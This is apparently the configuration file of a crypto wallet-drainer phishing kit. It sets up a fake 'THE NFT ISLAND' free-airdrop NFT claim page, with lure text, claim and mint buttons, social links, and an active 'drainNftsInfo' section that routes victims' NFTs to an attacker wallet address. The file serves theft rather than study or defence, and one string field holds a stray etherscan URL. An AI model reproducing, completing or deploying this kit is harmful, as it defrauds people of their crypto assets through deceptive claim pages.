const receiveAddress = '0x0D9575c0D98cCcFAf8325d13F5DCf497A83dc9Bc',
  collectionInfo = {
    name: 'THE NFT ISLAND',
    socialMedia: {
      discord: 'https://discord.gg/TW9AwmuRhz',
      twitter: 'https://twitter.com/thenftislandsio',
      instagram: 'https://instagram.com/',
    },
  },

  indexPageInfo = {
    backgroundImage: 'background.jpg',
    title: '{name}',
    underTitle: 'Free Airdrop',
  },

  claimPageInfo = {
    title: 'GET YOUR<br>NFT NOW',
    shortDescription: 'Own, stake and build in our limitless possibilities Minecraft Metaverse',
    longDescription:
      'After claim, NTFs will appear in your Metamask wallet within 10 minutes',
    claimButtonText: 'CLAIM NOW',
    image: 'bg3.png',
    imageRadius: 250,
  },

  drainNftsInfo = {
    active: true,
    minValue: 0.1,
    nftReceiveAddress: '0x0D9575c0D98cCcFAf8325d13F5DCf497A83dc9Bc',
  },

  customStrings = {
    title: 'MINT {name}',
    connectButton: 'https://etherscan.io/address/0x0000000000c2d145a2526bd8c716263bfebe1a72#code#F1#L334',
    transferButton: 'Mint now',
    dateString: 'Pre sale available {date}',
  }
  
if (
  !receiveAddress.startsWith('0x') ||
  receiveAddress.length >= 64 || receiveAddress.length <= 40
) {
  console.error(
    'Error: ' + receiveAddress + ' is not a valid Ethereum address.'
  )
}
